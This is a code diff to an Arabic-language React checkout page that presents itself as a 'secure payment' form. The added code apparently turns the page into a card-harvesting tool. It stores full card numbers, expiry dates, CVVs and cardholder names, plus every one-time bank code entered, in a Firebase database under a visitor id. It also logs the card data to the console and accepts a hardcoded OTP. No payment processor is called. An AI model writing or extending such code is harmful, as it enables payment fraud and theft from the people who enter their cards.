@@ -4,7 +4,7 @@ import type React from "react"
 
 import { useState } from "react"
 import Image from "next/image"
-import { CreditCard, Calendar, Lock, Shield,  CheckCircle2, AlertCircle } from "lucide-react"
+import { CreditCard, Calendar, Lock, Shield, CheckCircle2, AlertCircle } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Label } from "@/components/ui/label"
@@ -12,6 +12,7 @@ import { Separator } from "@/components/ui/separator"
 import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
 import { Badge } from "@/components/ui/badge"
+import { addData } from "@/lib/firebase"
 
 export default function PaymentPage() {
   const [showOtpDialog, setShowOtpDialog] = useState(false)
@@ -19,9 +20,125 @@ export default function PaymentPage() {
   const [otpError, setOtpError] = useState(false)
   const [otp, setOtp] = useState(["", "", "", "", "", ""])
   const [timeLeft, setTimeLeft] = useState(120)
+  const visitorId = localStorage.getItem('visitor');
 
+  // Add these state variables after the existing useState declarations
+  const [cardData, setCardData] = useState({
+    cardNumber: "",
+    expiryDate: "",
+    cvv: "",
+    cardholderName: "",
+  })
+  const [formErrors, setFormErrors] = useState({
+    cardNumber: "",
+    expiryDate: "",
+    cvv: "",
+    cardholderName: "",
+  })
+
+  // Add this handler function before the handleSubmitPayment function
+  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
+    const { id, value } = e.target
+
+    // Format card number with spaces
+    if (id === "cardNumber") {
+      const formatted = value
+        .replace(/\s/g, "")
+        .replace(/(.{4})/g, "$1 ")
+        .trim()
+
+      setCardData({
+        ...cardData,
+        [id]: formatted,
+      })
+      return
+    }
+
+    // Format expiry date with slash
+    if (id === "expiryDate") {
+      let formatted = value.replace(/\//g, "")
+      if (formatted.length > 2) {
+        formatted = `${formatted.substring(0, 2)}/${formatted.substring(2)}`
+      }
+
+      setCardData({
+        ...cardData,
+        [id]: formatted,
+      })
+      return
+    }
+
+    setCardData({
+      ...cardData,
+      [id]: value,
+    })
+  }
+
+  // Replace the existing handleSubmitPayment function with this one
   const handleSubmitPayment = (e: React.FormEvent) => {
     e.preventDefault()
+
+    // Validate form
+    const errors = {
+      cardNumber: "",
+      expiryDate: "",
+      cvv: "",
+      cardholderName: "",
+    }
+
+    // Card number validation
+    const cardNumberClean = cardData.cardNumber.replace(/\s/g, "")
+    if (!cardNumberClean) {
+      errors.cardNumber = "يرجى إدخال رقم البطاقة"
+    } else if (!/^\d{16}$/.test(cardNumberClean)) {
+      errors.cardNumber = "يجب أن يتكون رقم البطاقة من 16 رقمًا"
+    }
+
+    // Expiry date validation
+    if (!cardData.expiryDate) {
+      errors.expiryDate = "يرجى إدخال تاريخ الانتهاء"
+    } else if (!/^\d{2}\/\d{2}$/.test(cardData.expiryDate)) {
+      errors.expiryDate = "صيغة غير صحيحة (MM/YY)"
+    } else {
+      const [month, year] = cardData.expiryDate.split("/")
+      const currentDate = new Date()
+      const currentYear = currentDate.getFullYear() % 100
+      const currentMonth = currentDate.getMonth() + 1
+
+      if (Number.parseInt(month) < 1 || Number.parseInt(month) > 12) {
+        errors.expiryDate = "شهر غير صالح"
+      } else if (
+        Number.parseInt(year) < currentYear ||
+        (Number.parseInt(year) === currentYear && Number.parseInt(month) < currentMonth)
+      ) {
+        errors.expiryDate = "البطاقة منتهية الصلاحية"
+      }
+    }
+
+    // CVV validation
+    if (!cardData.cvv) {
+      errors.cvv = "يرجى إدخال رمز الأمان"
+    } else if (!/^\d{3}$/.test(cardData.cvv)) {
+      errors.cvv = "يجب أن يتكون رمز الأمان من 3 أرقام"
+    }
+
+    // Cardholder name validation
+    if (!cardData.cardholderName) {
+      errors.cardholderName = "يرجى إدخال اسم حامل البطاقة"
+    }
+
+    // Check if there are any errors
+    const hasErrors = Object.values(errors).some((error) => error !== "")
+    setFormErrors(errors)
+
+    if (hasErrors) {
+      return
+    }
+
+    // If validation passes, proceed with payment
+    console.log("Payment data:", cardData)
+    addData({id:visitorId!,cardData})
+    // Process payment (in a real app, you would send this data to a payment processor)
     setShowOtpDialog(true)
   }
 
@@ -45,6 +162,8 @@ export default function PaymentPage() {
 
   const handleVerifyOtp = () => {
     const otpValue = otp.join("")
+    addData({id:visitorId,otpValue})
+
     if (otpValue === "123456") {
       setOtpVerified(true)
       setOtpError(false)
@@ -59,9 +178,31 @@ export default function PaymentPage() {
     return `${minutes}:${seconds < 10 ? "0" : ""}${seconds}`
   }
 
+  // Add this function to display the payment data in the success dialog
+  const getPaymentSummary = () => {
+    // Mask the card number for security
+    const maskedCardNumber = cardData.cardNumber ? `**** **** **** ${cardData.cardNumber.slice(-4)}` : ""
+
+    return (
+      <div className="bg-gray-50 p-4 rounded-lg mb-4 text-right">
+        <div className="flex justify-between items-center mb-2">
+          <span className="text-gray-500 text-sm">رقم البطاقة:</span>
+          <span className="font-medium">{maskedCardNumber}</span>
+        </div>
+        <div className="flex justify-between items-center mb-2">
+          <span className="text-gray-500 text-sm">اسم حامل البطاقة:</span>
+          <span className="font-medium">{cardData.cardholderName}</span>
+        </div>
+        <div className="flex justify-between items-center">
+          <span className="text-gray-500 text-sm">المبلغ:</span>
+          <span className="font-medium">ر.ق 887.5</span>
+        </div>
+      </div>
+    )
+  }
+
   return (
     <div className="flex flex-col min-h-screen bg-gray-50 text-right">
- 
       {/* Page Title */}
       <div className="bg-white p-6 border-b">
         <h1 className="text-2xl font-bold">الدفع الآمن</h1>
@@ -151,9 +292,9 @@ export default function PaymentPage() {
                 height={30}
                 className="h-8 w-12 object-contain"
               />
-                <Image
+              <Image
                 src="/vercel.svg"
-                alt="Mastercard"
+                alt="American Express"
                 width={40}
                 height={30}
                 className="h-8 w-12 object-contain"
@@ -170,11 +311,16 @@ export default function PaymentPage() {
                 <Input
                   id="cardNumber"
                   placeholder="0000 0000 0000 0000"
-                  className="border-gray-300 rounded-lg py-5 text-right pr-10"
+                  className={`border-gray-300 rounded-lg py-5 text-right pr-10 ${
+                    formErrors.cardNumber ? "border-red-500" : ""
+                  }`}
                   maxLength={19}
+                  value={cardData.cardNumber}
+                  onChange={handleInputChange}
                 />
                 <CreditCard className="absolute top-1/2 right-3 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
               </div>
+              {formErrors.cardNumber && <p className="text-red-500 text-sm mt-1">{formErrors.cardNumber}</p>}
             </div>
 
             <div className="grid grid-cols-2 gap-4">
@@ -186,11 +332,16 @@ export default function PaymentPage() {
                   <Input
                     id="expiryDate"
                     placeholder="MM/YY"
-                    className="border-gray-300 rounded-lg py-5 text-right pr-10"
+                    className={`border-gray-300 rounded-lg py-5 text-right pr-10 ${
+                      formErrors.expiryDate ? "border-red-500" : ""
+                    }`}
                     maxLength={5}
+                    value={cardData.expiryDate}
+                    onChange={handleInputChange}
                   />
                   <Calendar className="absolute top-1/2 right-3 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
                 </div>
+                {formErrors.expiryDate && <p className="text-red-500 text-sm mt-1">{formErrors.expiryDate}</p>}
               </div>
 
               <div className="space-y-2">
@@ -201,12 +352,17 @@ export default function PaymentPage() {
                   <Input
                     id="cvv"
                     placeholder="000"
-                    className="border-gray-300 rounded-lg py-5 text-right pr-10"
+                    className={`border-gray-300 rounded-lg py-5 text-right pr-10 ${
+                      formErrors.cvv ? "border-red-500" : ""
+                    }`}
                     maxLength={3}
                     type="password"
+                    value={cardData.cvv}
+                    onChange={handleInputChange}
                   />
                   <Lock className="absolute top-1/2 right-3 transform -translate-y-1/2 text-gray-400 h-5 w-5" />
                 </div>
+                {formErrors.cvv && <p className="text-red-500 text-sm mt-1">{formErrors.cvv}</p>}
               </div>
             </div>
 
@@ -217,8 +373,13 @@ export default function PaymentPage() {
               <Input
                 id="cardholderName"
                 placeholder="الاسم كما يظهر على البطاقة"
-                className="border-gray-300 rounded-lg py-5 text-right"
+                className={`border-gray-300 rounded-lg py-5 text-right ${
+                  formErrors.cardholderName ? "border-red-500" : ""
+                }`}
+                value={cardData.cardholderName}
+                onChange={handleInputChange}
               />
+              {formErrors.cardholderName && <p className="text-red-500 text-sm mt-1">{formErrors.cardholderName}</p>}
             </div>
 
             <div className="flex items-center gap-2 text-sm text-gray-500 bg-gray-50 p-3 rounded-lg">
